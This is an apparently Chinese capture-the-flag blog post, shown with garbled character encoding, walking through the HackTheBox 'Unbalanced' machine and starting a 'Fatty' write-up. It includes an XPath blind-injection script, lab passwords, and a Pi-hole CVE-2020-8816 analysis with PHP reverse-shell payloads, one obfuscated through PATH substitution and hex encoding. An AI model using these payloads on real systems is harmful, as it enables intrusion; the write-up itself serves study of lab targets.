comm_incoming() stats disabled ipcache IP Cache Stats and Contents disabled fqdncache FQDN Cache Stats and Contents protected idns Internal DNS Statistics disabled redirector URL Redirector Stats disabled store_id StoreId helper Stats disabled external_acl External ACL stats disabled http_headers HTTP Header Statistics disabled external_acl External ACL stats disabled http_headers HTTP Header Statistics disabled info General Runtime Information disabled service_times Service Times (Percentiles) disabled filedescriptors Process Filedescriptor Allocation protected objects All Cache Objects protected vm_objects In-Memory and In-Transit Objects protected io Server-side network read() size histograms disabled counters Traffic and Resource Counters protected peer_select Peer Selection Algorithms disabled digest_stats Cache Digest and ICP blob disabled 5min 5 Minute Average of Counters protected 60min 60 Minute Average of Counters protected utilization Cache Utilization disabled histograms Full Histogram Counts protected active_requests Client-side Active Requests disabled username_cache Active Cached Usernames disabled openfd_objects Objects with Swapout files open disabled store_digest Store Digest disabled store_log_tags Histogram of store.log tags disabled storedir Store Directory Stats disabled store_io Store IO Interface Stats disabled store_check_cachable_stats storeCheckCachable() Stats disabled refresh Refresh Algorithm Statistics disabled delay Delay Pool Levels disabled forward Request Forwarding Statistics disabled cbdata Callback Data Registry Contents protected sbuf String-Buffer statistics protected events Event Queue protected netdb Network Measurement Database disabled asndb AS Number Database disabled carp CARP information disabled userhash peer userhash information disabled sourcehash peer sourcehash information disabled server_list Peer Cache Statistics disabled å¯ä»¥çœ‹åˆ°é™¤äº†squidé…ç½®ä¸­å·²ç»æ ‡å‡ºçš„å¯ç”¨å‘½ä»¤å¤–,å…¶ä»–éƒ½æ˜¯disabledçš„ã€‚æ‰€ä»¥æˆ‘ä»¬ä¾æ¬¡è°ƒç”¨ä¸‹å¯»æ‰¾å…³é”®ä¿¡æ¯ã€‚åœ¨è°ƒç”¨åˆ°fqdncacheæ—¶ 123456789101112131415161718192021FQDN Cache Statistics:FQDNcache Entries In Use: 13FQDNcache Entries Cached: 11FQDNcache Requests: 12782FQDNcache Hits: 0FQDNcache Negative Hits: 7080FQDNcache Misses: 5702FQDN Cache Contents:Address Flg TTL Cnt Hostnames10.10.14.6 N -16959 0127.0.1.1 H -001 2 unbalanced.htb unbalanced::1 H -001 3 localhost ip6-localhost ip6-loopback172.31.179.2 H -001 1 intranet-host2.unbalanced.htb172.31.179.3 H -001 1 intranet-host3.unbalanced.htb10.10.10.200 N -1086 0127.0.0.1 H -001 1 localhost172.17.0.1 H -001 1 intranet.unbalanced.htbff02::1 H -001 1 ip6-allnodesff02::2 H -001 1 ip6-allrouters10.10.14.65 N 025 0 çœ‹åˆ°intranet-host3.unbalanced.htbåŠå¯¹åº”çš„ipã€‚ä¸éš¾æƒ³åˆ°å†…ç½‘é‡Œå¯èƒ½è¿˜æœ‰å…¶ä»–æœåŠ¡ã€‚è¿™é‡Œå…ˆè®¿é—®172.31.179.2ä¸172.31.179.3.å‘ç°ä¼šè¢«é‡å®šå‘åˆ°/inranet.phpä¹Ÿå°±æ˜¯è·Ÿä¹‹å‰åŒæ ·çš„ç½‘é¡µã€‚ä½†æ˜¯é¡ºç€è®¿é—®172.31.179.1æ—¶ æ²¡æœ‰å‡ºç°é‡å®šå‘ã€‚è¿™ç§æ€ªå¼‚è¡Œä¸ºå€¼å¾—é‡è§†ã€‚æˆ‘ä»¬å†æ¬¡è®¿é—®172.31.179.1/intranet.phpã€‚è¿™æ¬¡å°è¯•ç™»å½•æ—¶,ä¼šå‘ç°å®ƒä¼šå›æ˜¾Invalid credentials..ä¹Ÿå°±æ˜¯è¯´å¯ä»¥è·ŸæœåŠ¡äº¤äº’äº†ã€‚ æ—¢ç„¶å¦‚æ­¤è‚¯å®šå°±è¦åœ¨ç™»å½•å‚æ•°ä½œæ–‡ç« ã€‚æ— éä¸å°±æ˜¯sqlié‚£ä¸€å¥—ã€‚ç®€å•å°è¯•åå‘ç°å¯†ç å¤„å­˜åœ¨æ³¨å…¥.å½“ä»¥abc&#39; or &#39;1&#39;=&#39;1ä½œä¸ºå¯†ç æ—¶ä¼šå›æ˜¾å››ä¸ªç”¨æˆ·åä¸å¯¹åº”é‚®ç®±ã€‚ 123456789101112131415161718192021222324252627 ritaRita Fubellirita@unbalanced.htbRole: HR ManagerjimJim Mickelsonjim@unbalanced.htbRole: Web DesignerbryanBryan Angstrombryan@unbalanced.htbRole: System AdministratorsarahSarah Goodmansarah@unbalanced.htbRole: Team Leader bryanæ˜¯Administrator.è¯´æ˜å¾ˆæœ‰å¯èƒ½å°±æ˜¯éœ€è¦ä»–çš„ä¿¡æ¯ã€‚ä¸è¿‡è¿™é‡Œæœ‰ä¸ªç»†èŠ‚ä¸Šéœ€è¦æ³¨æ„ä¸‹ã€‚å½“æˆ‘å°è¯•å¦‚abc&#39; or 1=1#è¿™æ ·çš„payloadä¸å¯è¡Œ,abc&#39; or substr(&#39;abc&#39;,1,1)=&#39;aä¹Ÿä¸å¯è¡Œã€‚ä½†æ˜¯abc&#39; or substring(&#39;abc&#39;,1,1)=&#39;aæ˜¯å›æ˜¾äº†çœŸå€¼çš„ã€‚é‚£ä¹ˆè¿™é‡ŒçœŸçš„æ˜¯sqlæ³¨å…¥å—ï¼Ÿç­”æ¡ˆæ˜¯å¦å®šçš„ã€‚æˆ‘å¾ˆå¿«è”æƒ³åˆ°æ›¾ç»åœ¨npuctfä¸­å‡ºç°è¿‡ä¸€æ¬¡çš„xpathæ³¨å…¥ã€‚åŠ ä¸Šè¿™é‡Œå¹¶æ²¡æœ‰æ‰§è¡Œæ‰€è°“çš„ç™»å½•æ“ä½œï¼Œè€Œæ˜¯åœ¨ç•Œé¢å›æ˜¾htmlå—å†…å®¹ã€‚æˆ‘å¯ä»¥åˆ¤æ–­,è¿™é‡Œåº”è¯¥æ˜¯ä¸€ä¸ªxpathæ³¨å…¥è€Œä¸æ˜¯sqlæ³¨å…¥ã€‚ xpathæ¥ç›²æ³¨çš„è¯ã€‚æ¯”èµ·sqlå¸ƒå°”ç›²æ³¨æ›´åŠ ç®€å• 12345678910111213141516171819202122import requestsimport stringURL='http://172.31.179.1/intranet.php'proxies=&#123;'http':\"10.10.10.200:3128\"&#125;users=&#123;'bryan','rita','jim','sarah'&#125;for user in users: password=\"\" print(user) for i in range(1,30): a=0 print(i) for j in string.printable: data=&#123;\"Username\":\"a\",\"Password\":\"' or Username='\"+user+\"' and substring(Password,\"+str(i)+\",1)='\"+j+\"\"&#125; r=requests.post(URL,data=data,proxies=proxies) if len(r.text) &gt; 7000: password+=j a=1 print(password) break if a==0: break ç®€å•å†™ä¸ªç›²æ³¨è„šæœ¬,æ³¨æ„è¦æŒ‚å®ƒçš„proxyã€‚è¿™é‡Œä¼˜å…ˆè·‘bryançš„å¯†ç ã€‚å› ä¸ºè¿œç¨‹å®åœ¨å¤ªæ…¢äº†â€¦â€¦å¹¸å¥½bryanå°±æ˜¯ç³»ç»Ÿç”¨æˆ·ã€‚ä½¿ç”¨å®ƒçš„å¯†ç å³å¯sshç™»å½•ã€‚ å…¶ä»–äººçš„å¯†ç åæ¥èŠ±äº›æ—¶é—´ä¹Ÿè·‘å‡ºæ¥äº†ã€‚ 1234bryan:ireallyl0vebubblegum!!!rita:password01!jim:stairwaytoheavensarah:sarah4evah bryanç™»å½•ä¸Šå»å°±èƒ½æ‹¿åˆ°user.txtäº†ã€‚ ç®€å•è¯´è¿™ä¸€éƒ¨åˆ†å…¶å®éš¾åº¦çœŸçš„ä¸€èˆ¬ã€‚ä¸»è¦æ˜¯ä½¿ç”¨å®ƒç»™çš„proxyè¿™æ­¥å¯èƒ½æœ‰çš„äººæ²¡åšè¿‡ã€‚ä½†æ˜¯å‡å¦‚åˆ©ç”¨å¥½rsyncå¾—åˆ°çš„confå°±èƒ½å¾ˆå¿«çŸ¥é“è¿™ç‚¹ã€‚æ‰€ä»¥éš¾åº¦ä¸€èˆ¬ã€‚åé¢æ¯”è¾ƒè¿·æƒ‘çš„è¿˜æ˜¯xpathä¸sqliä¸èƒ½æ··æ·†ã€‚ä¸è¿‡é€šè¿‡ç®€å•çš„fuzzè¿˜æ˜¯èƒ½åˆ¤æ–­å‡ºæ¥çš„ã€‚ privesc to rootbryanæ–‡ä»¶å¤¹ä¸‹æœ‰ä¸€ä¸ªTODO 123456789101112131415161718192021############# Intranet #############* Install new intranet-host3 docker [DONE]* Rewrite the intranet-host3 code to fix Xpath vulnerability [DONE]* Test intranet-host3 [DONE]* Add intranet-host3 to load balancer [DONE]* Take down intranet-host1 and intranet-host2 from load balancer (set as quiescent, weight zero) [DONE]* Fix intranet-host2 [DONE]* Re-add intranet-host2 to load balancer (set default weight) [DONE]- Fix intranet-host1 [TODO]- Re-add intranet-host1 to load balancer (set default weight) [TODO]############ Pi-hole ############* Install Pi-hole docker (only listening on 127.0.0.1) [DONE]* Set temporary admin password [DONE]* Create Pi-hole configuration script [IN PROGRESS]- Run Pi-hole configuration script [TODO]- Expose Pi-hole ports to the network [TODO] ä»è¿™é‡Œå¯ä»¥çœ‹å‡ºã€‚é¶æœºä¸Šå·²ç»è·‘å¥½äº†ä¸€ä¸ªdockerã€‚ä½†æ˜¯å®ƒæ˜¯è·‘åœ¨127ã€‚0.0.1çš„ã€‚å¹¶ä¸”æœ‰ä¸ªadminå¯†ç ã€‚Pi-hole é…ç½®æ–‡ä»¶å°šæœªå®Œæˆã€‚ ss -lntpçœ‹ä¸‹ç«¯å£ 1234567891011bryan@unbalanced:~$ ss -lntpState Recv-Q Send-Q Local Address:Port Peer Address:Port LISTEN 0 5 0.0.0.0:873 0.0.0.0:* LISTEN 0 128 127.0.0.1:8080 0.0.0.0:* LISTEN 0 128 127.0.0.1:5553 0.0.0.0:* LISTEN 0 32 0.0.0.0:53 0.0.0.0:* LISTEN 0 128 0.0.0.0:22 0.0.0.0:* LISTEN 0 5 [::]:873 [::]:* LISTEN 0 32 [::]:53 [::]:* LISTEN 0 128 [::]:22 [::]:* LISTEN 0 128 *:3128 *:* 8080ä¸5553æ˜æ˜¾æ˜¯è·‘åœ¨æœ¬åœ°ä¸Šçš„ã€‚å…¶ä¸­8080å¯ä»¥curlåˆ°ã€‚ä¸è¿‡ä¼šæé†’æˆ‘ä»¬hostnameä¸å¯¹ã€‚ æ—¢ç„¶æ˜¯ä¸ªwebæœåŠ¡ã€‚é‚£å…ˆç«¯å£è½¬å‘åˆ°æœ¬åœ°çœ‹çœ‹é•¿ä»€ä¹ˆæ ·ã€‚æˆ‘ä»¬ç›´æ¥ç”¨sshè½¬å‘ 12~C #è¿›å…¥sshå‘½ä»¤è¡Œ-L 8080:127.0.0.1:8080 å¢åŠ ä¸€ä¸ªHost: unbalanced å†æ¬¡æš´éœ²äº†ä¸€ä¸ªpihole.unbalanced.htb.ä»¥åŠå¯¹åº”çš„å†…ç½‘ip. è®¿é—®è¿™ä¸ªpiholeçš„åå°/admin.å› ä¸ºä¹‹å‰æç¤ºè¿‡æˆ‘ä»¬temporary admin password .æ‰€ä»¥ç”¨adminå°±èƒ½ç™»å…¥ã€‚è¿›å»åå‘ç°æ˜¯ä¸ª4.3.2ç‰ˆæœ¬çš„pihole. æš‚æ—¶æ²¡æ€è·¯ã€‚ä¸è¿‡æœç´¢ä¸‹å‘ç°ç‰ˆæœ¬åœ¨CVE-2020-8816å¯ç”¨èŒƒå›´å†…ã€‚è¿™ä¸ªæ˜¯å¯ä»¥ç›´æ¥rceæ‹¿åˆ°www-dataçš„shellçš„ã€‚è™½ç„¶è·Ÿæˆ‘ä»¬ææƒrootæ²¡å•¥å…³ç³»ã€‚ä½†æ˜¯ä¸å¦¨ä¸€è¯•ã€‚ç”¨è¿™çš„exphttps://github.com/AndreyRainchik/CVE-2020-8816 å› ä¸ºæˆ‘ä»¬å·²ç»è½¬å‘å¥½ç«¯å£äº†ã€‚æ‰€ä»¥ç›´æ¥æ‰“å°±æ˜¯äº†python3 CVE-2020-8816.py http://127.0.0.1:8080 admin 10.10.14.11 90001 www-dataçš„è¯è‚¯å®šå¾—ç»§ç»­æ”¶é›†ä¿¡æ¯äº†ã€‚ä½†æ˜¯æˆ‘æ„æƒ³ä¸åˆ°çš„æ˜¯www-dataå±…ç„¶å¯ä»¥ç›´æ¥è¿›è¿™ä¸ªdockerçš„rootç›®å½•â€¦â€¦ç®€ç›´å¯æ€•ã€‚ç„¶åé‡Œé¢æœ‰ä¹‹å‰æåˆ°çš„configæ–‡ä»¶ 1234567891011121314151617181920#!/bin/bash# Add domains to whitelist/usr/local/bin/pihole -w unbalanced.htb/usr/local/bin/pihole -w rebalanced.htb# Set temperature unit to Celsius/usr/local/bin/pihole -a -c# Add local host record/usr/local/bin/pihole -a hostrecord pihole.unbalanced.htb 127.0.0.1# Set privacy level/usr/local/bin/pihole -a -l 4# Set web admin interface password/usr/local/bin/pihole -a -p 'bUbBl3gUm$43v3Ry0n3!'# Set admin email/usr/local/bin/pihole -a email admin@unbalanced.htb adminçš„å¯†ç åˆæ˜¯ä¸€ä¸ªè·Ÿbubblegumæœ‰å…³çš„â€¦â€¦è¯•äº†ä¸‹sshç™»å½•rootæ²¡æˆã€‚suä¸€ä¸‹å±…ç„¶å°±æˆäº†â€¦â€¦ æ€ä¹ˆè¯´å‘¢ã€‚ææƒè¿™å—åªè¦nday pocå°±èƒ½æ‹¿www-data =&gt; ç„¶åå°±å¯ä»¥è¿›rootç›®å½•=&gt; ç„¶åç³»ç»Ÿå¯†ç ç›´æ¥å°±æš´éœ²å‡ºæ¥äº†ã€‚è¿™ä¸€è¿ä¸²æ“ä½œä»¤äººçª’æ¯ã€‚æœ‰ç‚¹åˆ»æ„è€Œä¸”è®©è¿™å°é¶æœºçš„ä½“éªŒç›´æ¥é™äº†ä¸€ä¸ªæ¡£æ¬¡ã€‚æ‰€ä»¥æ²¡å•¥æ€»ç»“çš„ã€‚ CVE-2020-8816å› ä¸ºåé¢æ²¡ä»€ä¹ˆæ”¶è·ï¼Œæ‰€ä»¥ç®€å•çœ‹äº†ä¸‹è¿™ä¸ªcveã€‚å‘ç°è¿˜æŒºæœ‰æ„æ€çš„ã€‚ https://xz.aliyun.com/t/7511 é¦–å…ˆã€‚piholeæœ‰è¿™æ ·ä¸€ä¸ªåŠŸèƒ½è®¾ç½®é™æ€DHCPï¼Œå°†IPåœ°å€å›ºå®šåˆ°ç»™å®šçš„MACåœ°å€ä¸Šè€Œä»–çš„æºç é‡Œè°ƒç”¨äº†å‘½ä»¤æ‰§è¡Œæ‹¼æ¥ 12345if(!strlen($error))&#123; exec(\"sudo pihole -a addstaticdhcp \".$mac.\" \".$ip.\" \".$hostname); $success .= \"A new static address has been added\";&#125; æ—¢ç„¶æ˜¯æ‹¼æ¥ã€‚å‡å¦‚æ²¡æœ‰è¿‡æ»¤åˆ°ä½é‚£å°±è‚¯å®šå¯ä»¥ç»•è¿‡ã€‚æˆ‘ä»¬çœ‹ä¸‹å®ƒä¸»è¦çš„è¿‡æ»¤æ–¹å¼ã€‚ 1234567891011121314151617function validMAC($mac_addr)&#123; // Accepted input format: 00:01:02:1A:5F:FF (characters may be lower case) return (preg_match('/([a-fA-F0-9]&#123;2&#125;[:]?)&#123;6&#125;/', $mac_addr) == 1); &#125;......$mac = $_POST[\"AddMAC\"]; $ip = $_POST[\"AddIP\"];$hostname = $_POST[\"AddHostname\"];if(!validMAC($mac))&#123; $error .= \"MAC address (\".htmlspecialchars($mac).\") is invalid!&lt;br&gt;\";&#125;$mac = strtoupper($mac); è¿™ä¸ªæ­£åˆ™å†™çš„å¹¶ä¸æ­£ç¡®ã€‚æ¯”å¦‚æˆ‘ä»¬ç›´æ¥ä½¿ç”¨aaaaaaaaaaaaå°±èƒ½é€šè¿‡æ ¡éªŒã€‚ç”šè‡³å¯ä»¥åœ¨åé¢åŠ ä¸Šä»»æ„shellä»£ç  12var_dump(validMAC('aaaaaaaaaaaa&amp;&amp;php -r \\'$sock=fsockopen(\"10.1.0.9\",2256);exec(\"bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");\\''));//bool(true) ä¸è¿‡å”¯ä¸€é‡ç‚¹å°±æ˜¯ã€‚ä»–å¯¹æˆ‘ä»¬çš„è¾“å…¥è°ƒç”¨äº†htmlspecialcharsä»¥åŠstrtoupper.åè€…æ¯”è¾ƒå…³é”®ã€‚ è¿™æ—¶é¦–å…ˆå°±è€ƒéªŒåˆ©ç”¨çš„phpæŠ€å·§äº†ã€‚å› ä¸ºåˆæ³•çš„macåé¢è·Ÿä»»æ„è¯­å¥éƒ½æ˜¯å¯ä»¥çš„ã€‚é‚£è‡ªç„¶æˆ‘ä»¬é€‰æ‹©phpä»£ç æ‰§è¡Œå‡½æ•°ã€‚(phpè‡ªå¸¦å‡½æ•°ä¸åŒºåˆ†å¤§å°å†™)ã€‚ä½¿ç”¨EXEC(HEX2BIN(xxxxx...))å³å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚æ¥ä¸‹æ¥é‡ç‚¹å°±æ˜¯ç»•è¿‡è¢«å˜æˆå¤§å†™çš„php -räº†ã€‚ è¿™ä¸€æ­¥å°±ç”¨åˆ°ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œçš„ç»•è¿‡æŠ€å·§äº†ã€‚å‡å¦‚æˆ‘ä»¬ä½¿ç”¨aaaaaaaaaaaa$PATH.ç³»ç»Ÿæ˜¯ä¼šè¿”å›PATHå˜é‡çš„ 1&#x2F;opt&#x2F;pihole:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin è€Œå…¶ä¸­pihole,usræ­£å¥½å¯ä»¥æ„é€ å‡ºp h rè¿™å‡ ä¸ªå­—æ¯ã€‚æ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨ 123456W&#x3D;$&#123;PATH#&#x2F;???&#x2F;&#125;P&#x3D;$&#123;W%%?????:&#125;X&#x3D;$&#123;PATH#&#x2F;???&#x2F;??&#125;H&#x3D;$&#123;X%%???:&#125;Z&#x3D;$&#123;PATH#:&#x2F;??&#125;R&#x3D;$&#123;Z%%&#x2F;&#125; ç®€å•ä¸¾ä¸ªä¾‹å­ã€‚åŸºæœ¬ä¸Šå°±æ˜¯åˆ©ç”¨linuxé€šé…ç¬¦æ¥è¿›è¡Œæ„é€ ã€‚ååˆ†ç²¾å¦™ 123root@pihole:&#x2F;# W&#x3D;$&#123;PATH#&#x2F;???&#x2F;&#125;&amp;&amp;P&#x3D;$&#123;W%%?????:*&#125;&amp;&amp;echo $W &amp;&amp; echo $Ppihole:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;binp æœ€åä»¥ç±»ä¼¼çš„payloadå‘½ä»¤æ‰§è¡Œ 1aaaaaaaaaaaa&amp;&amp;W&#x3D;$&#123;PATH#&#x2F;???&#x2F;&#125;&amp;&amp;P&#x3D;$&#123;W%%?????:*&#125;&amp;&amp;X&#x3D;$&#123;PATH#&#x2F;???&#x2F;??&#125;&amp;&amp;H&#x3D;$&#123;X%%???:*&#125;&amp;&amp;Z&#x3D;$&#123;PATH#*:&#x2F;??&#125;&amp;&amp;R&#x3D;$&#123;Z%%&#x2F;*&#125;&amp;&amp;$P$H$P$IFS-$R$IFS&#39;EXEC(HEX2BIN(&quot;706870202D72202724736F636B3D66736F636B6F70656E282231302E312E302E39222C32323536293B6578656328222F62696E2F7368202D69203C2633203E263320323E263322293B27&quot;));&#39;&amp;&amp; summaryå‰é¢å¾ˆæœ‰è¶£ã€‚åé¢å¾ˆç®€å•ã€‚ä¸è¿‡å¦‚æœæ·±å…¥ç ”ç©¶è¿™ä¸ªcveçš„è¯è¿˜æ˜¯æ¯”è¾ƒæœ‰æ”¶è·çš„ã€‚","categories":[],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"hackthebox","slug":"hackthebox","permalink":"https://www.bycsec.top/tags/hackthebox/"},{"name":"Linux","slug":"Linux","permalink":"https://www.bycsec.top/tags/Linux/"}]},{"title":"hackthebox-Fatty-JavaExploits","slug":"hackthebox-Fatty-JavaExploits","date":"2020-08-10T02:13:15.000Z","updated":"2021-02-18T05:09:16.155Z","comments":true,"path":"2020/08/10/hackthebox-Fatty-JavaExploits/","link":"","permalink":"https://www.bycsec.top/2020/08/10/hackthebox-Fatty-JavaExploits/","excerpt":"Faaty æ˜¯htbè¿™å‘¨åˆšé€€å½¹çš„é¶æœºã€‚æœ¬æ¥ä¸€å‘¨å‰è‡ªå·±æ‰“ç®—ä¸‹æ‰‹è¯•è¯•çš„,ä¸è¿‡åšäº†ä¸€ä¼šå‘ç°å› ä¸ºå³å°†é€€å½¹å°±å¹²è„†æç½®ç­‰ippsecå‡ºè§†é¢‘è‡ªå·±å†åš233. ä¸è¿‡æ•´ä½“æ¥è¯´è¿™å°é¶æœºçœŸçš„éå¸¸æœ‰è¶£ã€‚å¹¶ä¸”æ¶‰åŠåˆ°å¤§é‡çš„javaçŸ¥è¯†ã€‚åœ¨è¿™ä¸€æ¬¡å®é™…æ“ä½œä¸­è‡ªå·±æ‰çœŸæ­£ä½“ä¼šåˆ°å‰æ®µæ—¶é—´å·©å›ºjavaå¼€å‘çš„åŸºç¡€çŸ¥è¯†æœ‰å¤šä¹ˆé‡è¦ã€‚å› æ­¤è¿™é‡Œè®°å½•ä¸‹å…·ä½“æ“ä½œçš„æµç¨‹,å°†å­¦åˆ°çš„æ–°çŸ¥è¯†å·©å›ºä¸€ä¸‹ã€‚","text":"Faaty æ˜¯htbè¿™å‘¨åˆšé€€å½¹çš„é¶æœºã€‚æœ¬æ¥ä¸€å‘¨å‰è‡ªå·±æ‰“ç®—ä¸‹æ‰‹è¯•è¯•çš„,ä¸è¿‡åšäº†ä¸€ä¼šå‘ç°å› ä¸ºå³å°†é€€å½¹å°±å¹²è„†æç½®ç­‰ippsecå‡ºè§†é¢‘è‡ªå·±å†åš233. ä¸è¿‡æ•´ä½“æ¥è¯´è¿™å°é¶æœºçœŸçš„éå¸¸æœ‰è¶£ã€‚å¹¶ä¸”æ¶‰åŠåˆ°å¤§é‡çš„javaçŸ¥è¯†ã€‚åœ¨è¿™ä¸€æ¬¡å®é™…æ“ä½œä¸­è‡ªå·±æ‰çœŸæ­£ä½“ä¼šåˆ°å‰æ®µæ—¶é—´å·©å›ºjavaå¼€å‘çš„åŸºç¡€çŸ¥è¯†æœ‰å¤šä¹ˆé‡è¦ã€‚å› æ­¤è¿™é‡Œè®°å½•ä¸‹å…·ä½“æ“ä½œçš„æµç¨‹,å°†å­¦åˆ°çš„æ–°çŸ¥è¯†å·©å›ºä¸€ä¸‹ã€‚ å½“ç„¶ã€‚è¿™æ¬¡å®é™…æ“ä½œé€”ä¸­è¿˜æ˜¯æœ‰ä¸€å¤„å›°æ‰°ç€æˆ‘çš„åœ°æ–¹æ²¡æœ‰æ‰¾åˆ°å¥½çš„ç­”æ¡ˆã€‚å°±æ˜¯ideaä¸­èƒ½å¦é‡æ–°å¯¼å…¥å•ä¸ªjavaæ–‡ä»¶å¹¶ä¿®æ”¹å¼•å…¥jaråŒ…ä¸­classçš„å†…å®¹ã€‚ é¶æœºip: 10.10.10.174 æ”»å‡»æœº: 10.10.14.25 initial-foothold to useré¦–å…ˆnmapç®€å•æ‰«çš„ç»“æœåªæœ‰21,22ç«¯å£ã€‚21ç«¯å£å…è®¸åŒ¿åç™»å½•ã€‚å…¶ä¸­æœ‰4ä¸ªæ–‡ä»¶ã€‚ä¸€ä¸ªjaråŒ…ä¸ä¸‰ä¸ªnote note.txt 1234Dear members, because of some security issues we moved the port of our fatty java server from 8000 to the hidden and undocumented port 1337. Furthermore, we created two new instances of the server on port 1338 and 1339. They offer exactly the same server and it would be nice if you use different servers from day to day to balance the server load. We were too lazy to fix the default port in the &#39;.jar&#39; file, but since you are all senior java developers you should be capable of doing it yourself ;)Best regards, qtc ä»è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ã€‚è¿œç¨‹åº”è¯¥å¼€æ”¾äº†1337,1338,1339ç«¯å£æ¥ä½œä¸ºæœåŠ¡ç«¯ã€‚ç„¶åæˆ‘ä»¬è‡ªå·±ç”¨jaråŒ…å½“å®¢æˆ·ç«¯ã€‚ åŒæ—¶è¿™é‡Œæ¶‰åŠåˆ°ä¸€ä¸ªjava thick clientçš„æ¦‚å¿µã€‚ç®€å•è¯´å°±æ˜¯æ•°æ®å¤„ç†æœ‰å¾ˆå¤§ä¸€éƒ¨åˆ†ç”±å®¢æˆ·ç«¯å®Œæˆã€‚ note2 1234Dear members, we are currently experimenting with new java layouts. The new client uses a static layout. If your are using a tiling window manager or only have a limited screen size, try to resize the client window until you see the login from.Furthermore, for compatibility reasons we still rely on Java 8. Since our company workstations ship Java 11 per default, you may need to install it manually.Best regards, qtc note2 æç¤ºæˆ‘ä»¬ä½¿ç”¨java8. note3 1234Dear members, We had to remove all other user accounts because of some seucrity issues. Until we have fixed these issues, you can use my account:User: qtc Pass: clarabibiBest regards, qtc note3åˆ™ç›´æ¥æä¾›ç»™æˆ‘ä»¬ä¸€ç»„å¯è¡Œçš„è´¦å·ã€‚è‡³æ­¤noteå·²ç»çœ‹å®Œã€‚ftpæœåŠ¡ä¸Šè¿˜å‰©ä¸‹ä¸€ä¸ªfatty-client.jarã€‚æˆ‘ä»¬ä¸‹è½½ä¸‹æ¥è¿›è¡Œå®¡è®¡ å¼€å§‹æˆ‘æ˜¯ç›´æ¥æ‹¿åˆ°æœ¬æœºçš„ideaä¸Šçœ‹jaråŒ…çš„ã€‚é¦–å…ˆç»“æ„ä¸Šåº”è¯¥æ˜¯springæ¡†æ¶ç¼–å†™åŠŸèƒ½+swingç»„ä»¶ç¼–å†™guiã€‚ä½†æ˜¯å¹¶æ²¡æœ‰å¤ªå¤§æ”¶è·ã€‚æ¯”å¦‚å¸¸è§å¦‚readObjectè¿™æ ·çš„ååºåˆ—åŒ–å‡½æ•°æˆ‘å¹¶æ²¡æœ‰è§åˆ°ã€‚ä½†æ˜¯å´æœ‰writeObjectå­˜åœ¨ã€‚è¯´æ˜å¯èƒ½readObjectè¿™ä¸€æ“ä½œæ˜¯åœ¨æœåŠ¡ç«¯è¿›è¡Œçš„ã€‚é‚£ä¹ˆæˆ‘ä»¬è¿˜æ˜¯å…ˆå°è¯•ç›´æ¥ä½¿ç”¨è¿™ä¸ªjaråŒ…ã€‚çœ‹çœ‹å“ªé‡Œæœ‰æ¼æ´å¯å¯»ã€‚ é¦–å…ˆæ³¨æ„,é¢˜ç›®è¦æ±‚ç¯å¢ƒjava8ã€‚æ‰€ä»¥kaliå¯ä»¥å¾ˆå¥½çš„è§£å†³è¿™ä¸ªé—®é¢˜ã€‚æˆ‘ä»¬ç›´æ¥ä½¿ç”¨/usr/lib/jvm/java-8-openjdk-amd64/bin/javaè°ƒç”¨jaråŒ…å³å¯ã€‚ ä»ç•Œé¢ä»¥åŠæºç éƒ½èƒ½çœ‹å‡ºæ¥è¿™æ˜¯ä¸€ä¸ªç”¨java swingç»„ä»¶å†™å‡ºæ¥çš„guiç•Œé¢ã€‚ é¦–å…ˆå°è¯•ç™»å½•ã€‚ä½†ä¸å‡ºæ‰€æ–™æœç„¶å›æ˜¾Connection Errorã€‚è¿™ç‚¹æˆ‘ä»¬ä»jaråŒ…çš„beans.xmlå¯ä»¥çœ‹å‡º 123456789101112131415161718192021222324252627282930&lt;?xml version = \"1.0\" encoding = \"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\" http://www.springframework.org/schema/beans spring-beans-3.0.xsd\"&gt;&lt;!-- Here we have an constructor based injection, where Spring injects required arguments inside the constructor function. --&gt; &lt;bean id=\"connectionContext\" class = \"htb.fatty.shared.connection.ConnectionContext\"&gt; &lt;constructor-arg index=\"0\" value = \"server.fatty.htb\"/&gt; &lt;constructor-arg index=\"1\" value = \"8000\"/&gt; &lt;/bean&gt; &lt;!-- The next to beans use setter injection. For this kind of injection one needs to define an defaultconstructor for the object (no arguments) and one needs to define setter methods for the properties. --&gt; &lt;bean id=\"trustedFatty\" class = \"htb.fatty.shared.connection.TrustedFatty\"&gt; &lt;property name = \"keystorePath\" value = \"fatty.p12\"/&gt; &lt;/bean&gt; &lt;bean id=\"secretHolder\" class = \"htb.fatty.shared.connection.SecretHolder\"&gt; &lt;property name = \"secret\" value = \"clarabibiclarabibiclarabibi\"/&gt; &lt;/bean&gt;&lt;!-- For out final bean we use now again constructor injection. Notice that we use now ref instead of val --&gt; &lt;bean id=\"connection\" class = \"htb.fatty.client.connection.Connection\"&gt; &lt;constructor-arg index = \"0\" ref = \"connectionContext\"/&gt; &lt;constructor-arg index = \"1\" ref = \"trustedFatty\"/&gt; &lt;constructor-arg index = \"2\" ref = \"secretHolder\"/&gt; &lt;/bean&gt;&lt;/beans&gt; beançš„é…ç½®ä¸­å­˜åœ¨server.fatty.htb å¹¶é…ç½®ç«¯å£8000.å› æ­¤æˆ‘ä»¬éœ€è¦å°†è¿™ä¸ªhostnameåŠ å…¥/etc/hosts.ä¸è¿‡æ­¤å¤„æˆ‘ä»¬æœ‰ä¸¤ç§æ–¹æ³•ã€‚ä¸€ç§æ˜¯ç›´æ¥æ›´æ”¹jaråŒ…å¹¶é‡æ–°ä½¿ç”¨ã€‚å¦ä¸€ç§æ˜¯ä½¿ç”¨ä»£ç†è½¬å‘ä¸‹æµé‡ã€‚æˆ‘å› ä¸ºå·æ‡’é€‰æ‹©äº†ç¬¬äºŒç§ã€‚ å³,åœ¨hosts 